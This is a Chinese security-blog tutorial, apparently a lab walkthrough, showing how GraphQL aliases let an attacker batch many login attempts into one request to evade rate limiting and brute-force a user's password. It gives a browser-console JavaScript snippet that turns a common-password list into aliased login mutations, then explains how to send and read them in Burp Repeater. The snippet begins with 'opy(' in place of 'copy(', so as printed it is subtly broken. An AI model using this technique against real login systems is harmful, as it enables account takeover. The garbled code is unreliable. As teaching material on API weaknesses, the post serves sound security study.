#  【接口漏洞第八章第十一节】从理论到操作：GraphQL别名攻击完整流程  
原创 升斗安全XiuXiu
                    升斗安全XiuXiu  升斗安全   2026-02-01 13:18  
  
**【文章说明】**  
- **目的**  
：本文内容仅为网络安全**技术研究与教育**  
目的而创作。  
  
- **红线**  
：严禁将本文知识用于任何**未授权**  
的非法活动。使用者必须遵守《网络安全法》等相关法律。  
  
- **责任**  
：任何对本文技术的滥用所引发的**后果自负**  
，与本公众号及作者无关。  
  
- **免责**  
：内容仅供参考，作者不对其准确性、完整性作任何担保。  
  
**阅读即代表您同意以上条款。**  
  
****  
上一节分享了如何绕过速率限制[【接口漏洞第八章第十节】你以为的速率限制真的安全吗？GraphQL这个功能可能让它形同虚设](https://mp.weixin.qq.com/s?__biz=MjM5MzM0MTY4OQ==&mid=2447797839&idx=1&sn=10d179547a5b87bb366349e697523e38&scene=21#wechat_redirect)  
的理论内容，今天我们结合实际场景，来给大家演示以下如何实际操作。  
  
首先还是一样的，要找到对应的 GraphQL 端点，我们发现网站中的登录功能中，是采用GraphQL api的，我们尝试输入账号密码，点击登录，看看是什么情况。具体如下：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VPUK6Jz75Q0rzl84JA9KMSpNB0ZmiaGQia2NSB4lXZNfOJUdN7jYKxlShVGjWVZjWic67pibrZMFHbVnsZekJrJReQ/640?wx_fmt=png&from=appmsg "")  
  
在直接对密码进行正常爆破后，发现在爆破到一定次数后，系统会直接对我们进行拦截。这种情况下，我们就可以直接考虑利用在上一节中介绍的  
GraphQL别名功能，来辅助我们绕过系统的速率限制，并对密码进行爆破。  
  
在利用别名之前，因为要生成同一账号的大量不同密码进行爆破，我们可以通过在浏览器的控制台中，执行以下脚本，协助我们生成大量密码数据：  
```
opy(`123456,password,12345678,qwerty,123456789,12345,1234,111111,1234567,dragon,123123,baseball,abc123,football,monkey,letmein,shadow,master,666666,qwertyuiop,123321,mustang,1234567890,michael,654321,superman,1qaz2wsx,7777777,121212,000000,qazwsx,123qwe,killer,trustno1,jordan,jennifer,zxcvbnm,asdfgh,hunter,buster,soccer,harley,batman,andrew,tigger,sunshine,iloveyou,2000,charlie,robert,thomas,hockey,ranger,daniel,starwars,klaster,112233,george,computer,michelle,jessica,pepper,1111,zxcvbn,555555,11111111,131313,freedom,777777,pass,maggie,159753,aaaaaa,ginger,princess,joshua,cheese,amanda,summer,love,ashley,nicole,chelsea,biteme,matthew,access,yankees,987654321,dallas,austin,thunder,taylor,matrix,mobilemail,mom,monitor,monitoring,montana,moon,moscow`.split(',').map((element,index)=>`
bruteforce$index:login(input:{password: "$password", username: "carlos"}) {
        token
        success
    }
`.replaceAll('$index',index).replaceAll('$password',element)).join('\n'));console.log("The query has been copied to your clipboard.");
```  
  
生成的密码字典，直接粘贴到文本工具中备用即可：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VPUK6Jz75Q0rzl84JA9KMSpNB0ZmiaGQiaw2Cw1TJicogicj8GiaIys9z1DPeThib2Yq4j3jNYibvZQk4QPUNPgLa79Ug/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VPUK6Jz75Q0rzl84JA9KMSpNB0ZmiaGQiaAeb8eltk6aRSKpLRLzFCEnvrdRibP9zv4LxTRkalt7LZ2qZp69bDykw/640?wx_fmt=png&from=appmsg "")  
  
将请求发送至burpsuite工具的repeater中，我们就可以结合以上生成的字典密码，来利用   
GraphQL别名   
功能进行一次绕过速率限制的爆破动作。  
  
这种操作的难点在于我们要搞对   
GraphQL 别名  
 请求时的参数格式，否则将难以进行，我们参考以下格式就可以了【主要是请求参数开始前要将   
"query":"mutation  
  进行声明，以及  
参数值前后都需要加   
\  
 进行标识】  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VPUK6Jz75Q0rzl84JA9KMSpNB0ZmiaGQiaHhxId6bJp6JPEJUJZCAk7aialxTbOMPDnIiaasmXibC0e1geLMrSiakdfA/640?wx_fmt=png&from=appmsg "")  
  
执行成功后，我们直接搜索登录状态是否返回 true 的即可，然后找到自己对应生成的字典内容，即可完成密码爆破并使用获取到的密码进行登录了。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VPUK6Jz75Q0rzl84JA9KMSpNB0ZmiaGQiaLo6ytdDZjicCAfK1GWTucrLTfcXbnRjT2Zm9LlLNpxqiblFU2C3NJOAg/640?wx_fmt=png&from=appmsg "")  
  
好了，今天的结合  
GraphQL 别名  
功能进行绕过速率限制的实际操作，就分享到这里。后续这边还会继续分享更多有关api接口的更多漏洞，感兴趣的可以点点关注。  
  
觉得内容对你有用或无用，欢迎点赞或留言，这边会不断更正。  
  
